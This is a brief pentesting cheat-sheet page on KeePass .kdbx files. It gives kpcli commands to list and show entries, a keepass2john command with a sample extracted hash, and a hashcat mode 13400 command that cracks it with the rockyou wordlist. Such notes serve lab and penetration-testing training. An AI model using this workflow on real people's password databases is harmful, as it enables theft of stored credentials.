# KeePass kdbx

### Enumeration

You find .kdbx file.&#x20;

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

### Access to the file

```bash
# Install
sudo apt-get install kpcli libterm-readline-gnu-perl libdata-password-perl

# Read access (Assume that you crack the passwrod and save it in keypass file. 
kpcli --pwfile=./keypass --kdb=CEH.kdbx    
kpcli:/> help  
kpcli:/> ls 
kpcli:/> cd CEH 
kpcli:/> ls 

# Show entry - change the number
kpcli:/CEH> show 0
kpcli:/CEH> show -f 0
```

### Cracking kdbx file&#x20;

{% code overflow="wrap" %}
```bash
# keepass2john 
keepass2john passwords.kdbx

passwords:$keepass$*2*6000*0*c80872be5955aae39c3fbeb45bd6087404e437bf351a1f7bb44c6f5ae5d29da6*917a3c98d43ddf03b41d1f8af212ef3b878127e6b2528dbba09d03a78b9d8d9e*e50a138ff7357c232c148783eb7640bd*9f4c1c728e55174fbff99f6bba259375a45f4f8495e92b39879f837fd3a93a21*9ca4d0bd79793be01b3038007eaf376340889ff2df7d60f890a5f9b8567637ed

#hashcat 
hashcat -m 13400 hashes.txt /usr/share/wordlists/rockyou.txt 
```
{% endcode %}



